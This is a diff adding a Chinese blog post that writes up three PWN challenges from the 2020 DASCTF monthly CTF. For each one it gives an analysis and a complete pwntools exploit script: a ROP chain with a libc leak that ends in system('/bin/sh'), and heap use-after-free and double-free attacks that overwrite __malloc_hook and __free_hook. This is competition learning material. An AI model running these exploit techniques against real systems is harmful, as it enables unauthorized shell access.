@@ -1,0 +1,199 @@
+<!DOCTYPE html><html><head><title> 安恒月赛2020DASCTF——PWN &middot; Surager</title><!-- Begin Jekyll SEO tag v2.7.1 --><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="安恒月赛2020DASCTF——PWN" /><meta property="og:locale" content="en_US" /><meta name="description" content="前言" /><meta property="og:description" content="前言" /><link rel="canonical" href="http://localhost:4000/_posts/2020-04-25-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2020DASCTF-PWN/" /><meta property="og:url" content="http://localhost:4000/_posts/2020-04-25-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2020DASCTF-PWN/" /><meta property="og:site_name" content="Surager" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-25T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="安恒月赛2020DASCTF——PWN" /><meta name="google-site-verification" content="YIKi1rBnyUaS-DMYiluseI5kZzTwjCkTFmKkSkMZDJk" /><meta name="baidu-site-verification" content="szbTSfUGAB" /> <script type="application/ld+json"> {"url":"http://localhost:4000/_posts/2020-04-25-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2020DASCTF-PWN/","headline":"安恒月赛2020DASCTF——PWN","datePublished":"2020-04-25T00:00:00+08:00","dateModified":"2020-04-25T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/_posts/2020-04-25-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2020DASCTF-PWN/"},"description":"前言","@type":"BlogPosting","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --><meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1" /><meta http-equiv="content-type" content="text/html; charset=utf-8" /><link rel="alternate" href="/feed.xml" title="Surager's blog" type="application/rss+xml" /><link rel="apple-touch-icon-precomposed" href="/static/assets/img/landing/avatar.jpg" /><link rel="shortcut icon" href="/static/assets/img/landing/avatar.jpg" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/gh/poole/lanyon@v1.1.0/public/css/poole.min.css,gh/poole/lanyon@v1.1.0/public/css/lanyon.min.css,gh/poole/lanyon@v1.1.0/public/css/syntax.min.css" /><link rel="stylesheet" href="/static/assets/script/admonitions.css" /> <script async="async" src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/js/all.min.js" ></script> <script src='https://zz.bdstatic.com/linksubmit/push.js' async="async" ></script><style> .wrap { transition-property: width,background-size,transform; transition-duration: .3s; transition-timing-function: ease-in-out; min-height: 100%; display: inline-block; background-size: 100% auto; background-position: 0% 0%; background-repeat: no-repeat; background-attachment: fixed; background-image: url(/assets/image/74559485_p1.webp); } @media (min-aspect-ratio: 2400/1850) { .wrap { background-image: url(/assets/image/71932901_p0.webp); } } .sidebar-overlay #sidebar-checkbox:checked ~ .wrap { width: calc(100% - 14rem); background-size: calc(100% - 14rem) auto; transform: translateX(14rem); } .layout-reverse.sidebar-overlay #sidebar-checkbox:checked ~ .wrap { transform: translateX(0); }</style><style> .sidebar, html, h1, h2, h3, h4, h5, h6 { font-family: "Fira Code", Consolas, PingFang SC, Menlo, Monaco, "Courier New", Microsoft JhengHei, monospace; }</style><style> h1, h2, h3, h4, h5, h6 { font-weight: bold; }</style><style> .post h1, .post h2, .post h3, .post h4, .post h5, .post h6 { font-weight: 550; }</style><style> img { display: inline-block; margin: 0; }</style><style> ::-webkit-scrollbar { width: 3px; height: 3px; } ::-webkit-scrollbar-thumb { background-image: linear-gradient(45deg, Cyan 0%, Magenta 50%, Yellow 100%); }</style><style> ::selection { color: White; background: Black; }</style><body class="theme-base-07 sidebar-overlay"> <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular styles, `#sidebar-checkbox` for behavior. --> <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" /> <!-- Toggleable sidebar --><div class="sidebar" id="sidebar"><div class="sidebar-item"><div class="effect effect-right_to_left"> <img class="effect-img" src="/static/assets/img/landing/avatar.jpg" alt="img" /><div class="effect-info"> 19计算机专业在读<br/> Blue-Whale<br/> V&N<br/> 龙鸣PWN手<br/> 希望你能在这里学到东西<br/> <a href="mailto:surager2019@gmail.com"> <i class="fas fa-envelope"></i> </a> <a href="https://github.com/Surager"> <i class="fab fa-github"></i> </a> <a href="https://surager.pub/feed.xml"> <i class="fas fa-rss"></i> </a> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=100% height=52 src="https://music.163.com/outchain/player?type=2&id=1453894413&auto=0&height=32" ></iframe></div></div></div><nav class="sidebar-nav"> <a class="sidebar-nav-item" href="/"> <i class="fas fa-home fa-fw"></i> 首页 </a> <a class="sidebar-nav-item" href="/comments/"> <i class="fas fa-comments fa-fw"></i> 留言 </a> <a class="sidebar-nav-item" href="/tags/"> <i class="fas fa-tags fa-fw"></i> 标签 </a> <a class="sidebar-nav-item" href="/archive/"> <i class="fas fa-archive fa-fw"></i> 归档 </a> <a class="sidebar-nav-item" href="/about/"> <i class="fas fa-address-card fa-fw"></i> 关于 </a></nav><div class="sidebar-item"><style> #sidebar-search-input { background: none; border: none; color: White; width: 100%; } #sidebar-search-results-container { overflow: auto auto; max-height: 66.6vh; }</style><input id="sidebar-search-input" placeholder="搜索博文" /><ol id="sidebar-search-results-container" ></ol><script src='https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.11/dest/simple-jekyll-search.min.js' async='async' onload=' SimpleJekyllSearch({ json: "/assets/simple-jekyll-search/search.json", searchInput: document.getElementById("sidebar-search-input"), resultsContainer: document.getElementById("sidebar-search-results-container"), searchResultTemplate: `<li><a href="{url}">{title}</a>`, limit: 999, fuzzy: true })' ></script><style> #toc { overflow: auto auto; max-height: 66.6vh; }</style><ol id="toc"><li><a href="#%E5%89%8D%E8%A8%80">前言</a><li><a href="#echo_server">echo_server</a><ol><li><a href="#analysis">analysis</a><li><a href="#exp">exp</a><li><a href="#flag">flag</a></ol><li><a href="#sale_office">sale_office</a><ol><li><a href="#analysis-1">analysis</a><li><a href="#exp-1">exp</a><li><a href="#flag-1">flag</a></ol><li><a href="#sale_office2">sale_office2</a><ol><li><a href="#analysis-2">analysis</a><li><a href="#exp-2">exp</a><li><a href="#flag-2">flag</a></ol></ol><style> .sidebar-checkbox { display: none; } .sidebar-toggle { position: fixed; }</style><style> .sidebar { overflow: scroll; min-height: 101%; }</style><style> .effect { margin: 1rem; perspective: 900px; } .effect-info { text-align: center; backface-visibility: hidden; position: absolute; top: 0; transform-style: preserve-3d; } .effect-img { z-index: 11; width: 100%; height: 100%; position: relative; transition: all 0.5s ease-in-out; } .effect-img:before { position: absolute; display: block; } .effect-right_to_left .effect-img { transform-origin: 0% 50%; } .effect-right_to_left:hover .effect-img { transform: rotate3d(0, 1, 0, -180deg); }</style><div> <i class="fas fa-cog fa-spin fa-fw"></i> <span id="run_time_day"> <i class="fas fa-spinner fa-pulse"></i> </span>天 <span id="run_time_hour"> <i class="fas fa-spinner fa-pulse"></i> </span>时 <span id="run_time_minute"> <i class="fas fa-spinner fa-pulse"></i> </span>分 <span id="run_time_second"> <i class="fas fa-spinner fa-pulse"></i> </span>秒 <script> setInterval(function (d,h,m,s,b) { function setzero(i) { return i < 10 ? "0" + i : i; } let BirthDay = new Date(b); let today = new Date(); let timeold = (today.getTime() - BirthDay.getTime()); let sectimeold = timeold / 1000; let secondsold = Math.floor(sectimeold); let msPerDay = 24 * 60 * 60 * 1000; let e_daysold = timeold / msPerDay; let daysold = Math.floor(e_daysold); let e_hrsold = (e_daysold - daysold) * 24; let hrsold = Math.floor(e_hrsold); let e_minsold = (e_hrsold - hrsold) * 60; let minsold = Math.floor((e_hrsold - hrsold) * 60); let seconds = Math.floor((e_minsold - minsold) * 60); d.textContent = daysold; h.textContent = setzero(hrsold); m.textContent = setzero(minsold); s.textContent = setzero(seconds); }, 1000, document.getElementById("run_time_day"), document.getElementById("run_time_hour"), document.getElementById("run_time_minute"), document.getElementById("run_time_second"), "10/27/2019 00:00:00")// 这是我第一篇CSDN博客的时间 </script></div><div><div> <i class="fas fa-eye fa-fw"></i> <span id="busuanzi_value_page_pv"> <i class="fas fa-spinner fa-pulse"></i> </span>次</div><div> <i class="fas fa-paw fa-fw"></i> <span id="busuanzi_value_site_pv"> <i class="fas fa-spinner fa-pulse"></i> </span>枚</div><div> <i class="fas fa-user-friends fa-fw"></i> <span id="busuanzi_value_site_uv"> <i class="fas fa-spinner fa-pulse"></i> </span>人</div><script src='https://cdn.jsdelivr.net/npm/busuanzi@2.3.0' async='async' ></script></div><div> <i class="fas fa-thumbs-up fa-fw"></i> <a href="https://jekyll-theme-WuK.wu-kan.cn"> jekyll-theme-WuK </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://aidaip.github.io"> AiDai </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://coinc1dens.github.io/"> Coin哥哥 </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://www.freejishu.com/"> freejishu的美丽世界 </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://hitcxy.com"> pikachu's Blog </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://n0vice.gitee.io/"> N0vice </a></div><div> <i class="fa fa-users fa-fw"></i> <a href="https://phuker.github.io/"> 腾汛新闻 </a></div><div> <i class="fas fa-copyright fa-fw"></i> 2019-2021 Surager</div></div></div><!-- Wrap is the content to shift when toggling the sidebar. We wrap the content to avoid any CSS collisions with our real content. --><div class="wrap"><style> pre { max-height: 66.6vh; overflow: auto; }</style><style> .container { min-width: 66.6%; }</style><style> .container.content { padding-top: 1rem; padding-bottom: 1px; margin-top: 1.5rem; margin-bottom: 1.5rem; border-radius:10px; box-shadow:0px 0px 0px 3px #bb0a0a, 0px 0px 0px 6px #2e56bf, 0px 0px 0px 9px #ea982e; background-color: rgba(255,255,255,0.95); animation-duration: 2s; animation-name: fadeIn; } .masthead{ padding-top: 1rem; padding-bottom: 1rem; margin-bottom: 1.5rem; box-shadow: 0 0 5rem rgba(0, 0, 0, 0.1); background-color: rgba(255,255,255,0.99); animation-duration: 2s; animation-name: fadeIn; } @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }</style><div class="container content"><div class="page"><div class="post"> <span class="post-date"> <i class="fas fa-calendar-day fa-fw"></i> Time: 2020-04-25 <i class="fas fa-tag fa-fw"></i> Tags: Writesup <br/> <i class="fas fa-link fa-fw"></i> Link: <a href="/_posts/2020-04-25-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2020DASCTF-PWN/"> 安恒月赛2020DASCTF——PWN </a> </span><h2 id="前言">前言</h2><p>昨晚跟那群大佬玩机器人狼人杀，搅屎搅了三局，睡得太晚了。导致今天精神萎靡。</p><p>这几天以来一道PWN题目都没做过，对堆题极度过敏。但凡见到菜单直接删文件，关虚拟机。</p><p>上午做了一上午被窝战神，下午睡到2点钟。醒来发现安恒月赛开打了。</p><p>今天突然来了精神，想自己调调试试，不知不觉中就把这次的pwn题ak了。但是这不是我厉害，而是题目简单。</p><blockquote><p>但凡是做出来的题，都是出题人故意出简单的。但凡没做出来的题，都是我菜。</p></blockquote><h2 id="echo_server">echo_server</h2><h3 id="analysis">analysis</h3><pre><code> ○ file test
+test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=eb00905eb1396dad1b1689a02c6377b29dfabc00, stripped
+ ○ checksec test
+[*] '/mnt/e/BaiduNetdiskDownload/DASCTF/2004225e9ff11d445a3/test'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>经典栈溢出题，返回到main函数的时候有问题。就直接找了个call给填上了。</p><pre><code class="language-assembly">.text:00000000004007A5                 call    sub_4006D2
+</code></pre><h3 id="exp">exp</h3><pre><code class="language-python">from pwn import *
+io = remote("183.129.189.60",10005)
+#io = process("./test")
+elf =ELF("./test")
+libc = ELF('./libc.so.6')
+context.log_level = 'debug'
+
+rdi = 0x0000000000400823
+rsi_r15 = 0x0000000000400821
+format_str1 = 0x400875
+main =0x4007A5
+ret =0x000000000040055e
+
+io.recvuntil('name: ')
+io.sendline(str(0x100))
+io.recvuntil('name? ')
+payload = 'a'*0x80+'a'*0x8+p64(rdi) + p64(format_str1) + p64(rsi_r15) + p64(elf.got['read']) + p64(0x0) + p64(elf.plt['printf']) + p64(main)
+io.send(payload)
+leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+log.info(hex(leak))
+libc_base = leak - libc.sym['read']
+system = libc_base + libc.sym['system']
+binsh = libc_base + libc.search('/bin/sh').next()
+io.recvuntil('name: ')
+io.sendline(str(0x100))
+io.recvuntil('name? ')
+payload = 'a'*0x80+'a'*0x8+p64(ret) + p64(rdi)+p64(binsh) + p64(system)
+io.send(payload)
+io.interactive()
+</code></pre><h3 id="flag">flag</h3><p>efc5b74ddb1cfc7a80237e46ed288395</p><h2 id="sale_office">sale_office</h2><h3 id="analysis-1">analysis</h3><pre><code>○ file sales_office
+sales_office: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=29f903654192dcdd9f1fa393c3712ddfec954dda, not stripped
+ ○ checksec sales_office
+[*] '/mnt/e/BaiduNetdiskDownload/DASCTF/2004225e9ff11dc91f1/sales_office/sales_office'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>64位的动态链接ELF文件没开PIE。libc2.27。</p><p>add函数：</p><pre><code class="language-c">  if ( num &gt; 12 )
+    puts("You have no money.");
+  v0 = num;
+  area[v0] = malloc(0x10uLL);
+  puts("Please input the size of your house:");
+  v3 = read_int();
+  if ( v3 &gt; 0x60 )
+    return puts("You can't afford it.");
+  if ( v3 &lt; 0 )
+    return puts("?");
+  *(area[num] + 2) = v3;
+  v2 = area[num];
+  *v2 = malloc(v3);
+  puts("please decorate your house:");
+  read(0, *area[num], v3);
+  puts("Done!");
+  return num++ + 1;
+</code></pre><p>其中malloc后没有清除掉。</p><pre><code class="language-c">  if ( v3 &gt; 0x60 )
+    return puts("You can't afford it.");
+  if ( v3 &lt; 0 )
+    return puts("?");
+</code></pre><p>利用这个可以单独malloc出一个0x10大小的chunk来。</p><pre><code class="language-c">int sell()
+{
+  int v1; // [rsp+Ch] [rbp-4h]
+
+  puts("index:");
+  v1 = read_int();
+  if ( v1 &lt; 0 || v1 &gt; 12 )
+    exit(0);
+  if ( area[v1] )
+  {
+    free(*area[v1]);
+    free(area[v1]);
+  }
+  return puts("Done!");
+}
+</code></pre><p>UAF漏洞。</p><p>思路：</p><ol><li>通过malloc(-1)等操作获得一个可写的0x10chunk，将got地址写入，得到libc。<li>double free打malloc_hook。<li>此题与XCTF高校战疫的easyheap仅仅差一个edit函数。</ol><h3 id="exp-1">exp</h3><pre><code class="language-python">from pwn import *
+#io = process("./sales_office")
+io = remote("183.129.189.60",10008)
+elf = ELF("./sales_office")
+libc = ELF("./libc.so.6")
+#context.log_level = 'debug'
+
+def add_fake():
+    io.sendlineafter("choice:",'1')
+    io.sendlineafter("house:\n",'-1')
+
+def add(size,con):
+    io.sendlineafter("choice:",'1')
+    io.sendlineafter("house:\n",str(size))
+    io.sendafter("house:\n",con)
+
+def free(idx):
+    io.sendlineafter("choice:",'4')
+    io.sendlineafter("index:\n",str(idx))
+
+def show(idx):
+    io.sendlineafter("choice:",'3')
+    io.sendlineafter("index:\n",str(idx))
+
+def dbg():
+    gdb.attach(io)
+    pause()
+
+add(0x60,'a')#0
+add(0x60,'a')#1
+add(0x60,'a')#2
+for i in range(3):
+    free(i)
+add_fake()
+add(0x10,p64(elf.got['free']))
+show(0)
+leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+libc_base = leak - libc.sym['free']
+malloc_hook = libc_base + libc.sym['__malloc_hook']
+one = libc_base + 0x10a38c
+free(1)
+free(2)
+add(0x10,p64(malloc_hook))
+add(0x10,p64(one))
+io.sendlineafter("choice:",'1')
+io.interactive()
+</code></pre><h3 id="flag-1">flag</h3><p>flag{fb1dc590ab91fe3a7422753161573991}</p><h2 id="sale_office2">sale_office2</h2><h3 id="analysis-2">analysis</h3><p>跟上一题一样，由于是libc2.29，tcache double free不好用了。</p><p>思路：</p><ol><li>同上一问。<li>把tcachebin填满之后进fastbin，fastbin double free之后放进tcachebin。<li>add到最后num不够了，改成打free_hook。</ol><h3 id="exp-2">exp</h3><pre><code class="language-python">from pwn import *
+io = process("./sales_office")
+#io = remote("das.wetolink.com",28499)
+elf = ELF("./sales_office")
+libc = ELF("./libc.so")
+#context.log_level = 'debug'
+
+def add_fake():
+    io.sendlineafter("choice:",'1')
+    io.sendlineafter("house:\n",'-1')
+
+def add(size,con):
+    io.sendlineafter("choice:",'1')
+    io.sendlineafter("house:\n",str(size))
+    io.sendafter("house:\n",con)
+
+def free(idx):
+    io.sendlineafter("choice:",'4')
+    io.sendlineafter("index:\n",str(idx))
+
+def show(idx):
+    io.sendlineafter("choice:",'3')
+    io.sendlineafter("index:\n",str(idx))
+
+def dbg():
+    gdb.attach(io)
+    pause()
+
+add(0x60,'a')#0
+add(0x60,'a')#1
+add(0x60,'a')#2
+for i in range(3):
+    free(i)
+add_fake()
+add(0x10,p64(elf.got['free']))
+show(0)
+leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+libc_base = leak - libc.sym['free']
+log.info(hex(libc_base))
+free_hook = libc_base + libc.sym['__free_hook']
+log.info(hex(free_hook))
+one = libc_base + 0xe2383
+
+add(0x10,'a')
+add(0x10,'a')
+add(0x10,'a')
+add(0x10,'a')
+add_fake()
+free(4)
+free(5)
+free(6)
+free(8) # 填7个chunk进tcachebin
+
+free(1)
+free(7)
+free(2) # fastbin double free
+
+add(0x10,'a')
+add(0x10,'a')
+add(0x10,'a')
+add_fake()# 取出所有tcache
+
+add(0x10,p64(free_hook))
+add(0x10,'a')
+add(0x10,p64(one))
+io.sendlineafter("choice:",'4')
+io.sendlineafter("index:\n",'0')
+io.interactive()
+</code></pre><h3 id="flag-2">flag</h3><p>flag{THE_FLAG_OF_THIS_STRING}</p></div><div id="disqus_thread"></div><script> (function() { var d = document, s = d.createElement('script'); s.src = 'https://surager-pub.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <script> (function($){ setInterval(() => { $.each($('iframe'), (arr,x) => { let src = $(x).attr('src'); if (src && src.match(/(ads-iframe)|(disqusads)/gi)) { $(x).remove(); } }); }, 300); })(jQuery); </script> <br/> <i class="fas fa-coffee fa-fw"></i> <a href="/comments/">如果这篇博客帮助到你，可以留言夸夸我~</a> <br/> <i class="fab fa-creative-commons-by fa-fw"></i> <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="license"> CC BY-NC 4.0 </a> （除特别声明或转载文章外）</div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" /><style> .katex-display>.katex { white-space: normal; }</style><script src="https://cdn.jsdelivr.net/combine/npm/katex@0.12.0/dist/katex.min.js,npm/katex@0.12.0/dist/contrib/auto-render.min.js" async="async" onload='renderMathInElement(document.body, { delimiters: [{left: "$$", right: "$$", display: true}, { left: "$", right: "$", display: false }, {left: "\\(", right: "\\)", display: false}, {left: "\\[", right: "\\]", display: true}]})' ></script><style> pre.language-mermaid, code.language-mermaid { display: none; } .mermaid { overflow: auto auto; max-width: 100%; max-height: 66.6vh; }</style><script src="https://cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js" async="async" onload=' for(let x of document.getElementsByClassName("language-mermaid")) if(x.nodeName=="CODE") { let m = document.createElement("div"); m.classList.add("mermaid"); m.textContent = x.textContent; x.parentNode.insertAdjacentElement("beforebegin", m); }' ></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css,npm/prismjs@1.21.0/plugins/toolbar/prism-toolbar.min.css,npm/prismjs@1.21.0/plugins/match-braces/prism-match-braces.min.css,npm/prism-themes@1.4.0/themes/prism-nord.min.css" /> <script src="https://cdn.jsdelivr.net/combine/npm/prismjs@1.21.0/components/prism-core.min.js,npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js,npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.js,npm/prismjs@1.21.0/plugins/toolbar/prism-toolbar.min.js,npm/prismjs@1.21.0/plugins/match-braces/prism-match-braces.min.js" async="async" data-autoloader-path="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/components/" onload=' for(let x of document.getElementsByClassName("content")) x.classList.add("line-numbers","match-braces"); Prism.plugins.toolbar.registerButton("select-code", function (env) { let button = document.createElement("button"); button.textContent = "select this " + env.language; button.addEventListener("click", function () { if (document.body.createTextRange) { let range = document.body.createTextRange(); range.moveToElementText(env.element); range.select(); } else if (window.getSelection) { let selection = window.getSelection(); let range = document.createRange(); range.selectNodeContents(env.element); selection.removeAllRanges(); selection.addRange(range); } }); return button; })' ></script></div><label for="sidebar-checkbox" class="sidebar-toggle"></label>
